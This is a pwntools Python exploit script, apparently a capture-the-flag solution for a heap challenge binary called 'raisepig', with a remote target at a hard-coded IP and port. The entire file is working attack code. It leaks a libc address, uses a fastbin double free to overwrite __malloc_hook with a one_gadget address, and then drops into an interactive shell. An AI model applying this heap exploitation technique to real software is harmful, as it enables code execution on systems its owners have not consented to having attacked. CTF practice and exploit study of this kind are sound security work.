#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./raisepig"
elf=ELF(pwn_file)
os.environ["LD_LIBRARY_PATH"]="."
libc_address=0
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("./libc.so.6")
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("39.107.32.132",9999)
    pid=0

def debug():
    log.debug("libc address 0x%x"%libc_address)
    log.debug("process pid:%d"%pid)
    pause()

def add(namelen,name,t):
    conn.sendlineafter("Your choice :","1")
    conn.sendlineafter("Length of the name :",str(namelen))
    conn.sendafter("The name of pig :",name)
    conn.sendlineafter("The type of the pig :",t)

def show(index):
    conn.sendlineafter("Your choice :","2")
    conn.recvuntil("Name[%d] :"%index)
    name=conn.recvline()
    conn.recvuntil("Type[%d] :"%index)
    t=conn.recvline()
    return name,t

def eat(index):
    conn.sendlineafter("Your choice :","3")
    conn.sendlineafter("Which pig do you want to eat:",str(index))

def clean():
    conn.sendlineafter("Your choice :","4")

add(0x100,"a","t")#0
add(0x10,"a","t")#1
eat(0)
add(0xd0,"a"*8,"t")#2
name,t=show(2)
#libc_address=u64(name[8:14]+"\x00\x00")-0x3c4b78
libc_address=u64(name[8:14]+"\x00\x00")-3951480
add(0x60,"a","t")#3
add(0x60,"a","t")#4
#add(0x10000,"a"*0x10000,"t")#5
eat(3)
eat(4)
eat(3)
add(0x60,p64(libc.symbols["__malloc_hook"]+libc_address-19),"t")
add(0x60,"a","t")
add(0x60,"a","t")
#gadget=[0xf1147,0xf02a4]
gadget=[0xf1117,0xf0274,0x4526a,0x45216]
jump=gadget[2]+libc_address
debug()
add(0x60,"a"*3+p64(jump),"t")
eat(8)
conn.interactive()












